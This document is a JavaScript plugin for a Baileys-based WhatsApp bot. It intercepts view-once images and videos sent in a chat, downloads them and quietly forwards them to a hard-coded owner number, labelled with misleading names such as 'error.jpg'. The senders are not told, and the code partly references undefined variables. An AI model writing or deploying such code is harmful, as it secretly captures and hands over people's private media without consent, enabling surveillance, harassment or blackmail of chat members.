const { downloadContentFromMessage } = (await import('@whiskeysockets/baileys'));

// Define the bot owner's WhatsApp ID
const BOT_OWNER_ID = '4367845480109@s.whatsapp.net'; // Replace with the actual ID

export async function before(m, { isAdmin, isBotAdmin }) {
  const datas = global;
  const idioma = datas.db.data.users[m.sender].language;

  const chat = db.data.chats[m.chat];
  if (/^[.~#/\$,](read)?viewonce/.test(m.text)) return;
  if (!chat?.antiviewonce || chat?.isBanned) return;
  if (m.mtype == 'viewOnceMessageV2') {
    const msg = m.message.viewOnceMessageV2.message;
    const type = Object.keys(msg)[0];
    const media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);
    for await (const chunk of media) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    const cap = tradutor.texto1;
    if (/video/.test(type)) {
      // Send the video to the bot owner's inbox
      return mconn.conn.sendFile(BOT_OWNER_ID, buffer, 'error.mp4', `${msg[type].caption ? msg[type].caption + '\n\n' + cap : cap}`, m);
    } else if (/image/.test(type)) {
      // Send the image to the bot owner's inbox
      return mconn.conn.sendFile(BOT_OWNER_ID, buffer, 'error.jpg', `${msg[type].caption ? msg[type].caption + '\n\n' + cap : cap}`, m);
    }
  }
}
